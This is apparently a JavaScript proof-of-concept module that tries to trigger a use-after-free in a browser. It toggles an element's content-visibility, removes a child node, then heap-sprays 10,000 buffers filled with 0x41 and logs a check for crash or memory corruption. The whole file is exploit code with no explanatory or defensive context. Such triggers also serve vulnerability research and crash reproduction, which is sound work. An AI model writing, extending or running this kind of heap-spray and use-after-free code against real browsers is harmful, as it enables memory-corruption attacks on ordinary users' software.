import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  const spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    arr.fill(0x41);
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  if (!container || !child) {
    debug_log("Missing container or child element.");
    return;
  }

  container.style.contentVisibility = "hidden";
  child.remove();

  setTimeout(() => {
    container.style.contentVisibility = "auto";
    const spray = heapSpray();
    debug_log("UAF triggered. Check for crash or memory corruption.");
  }, 0);
}
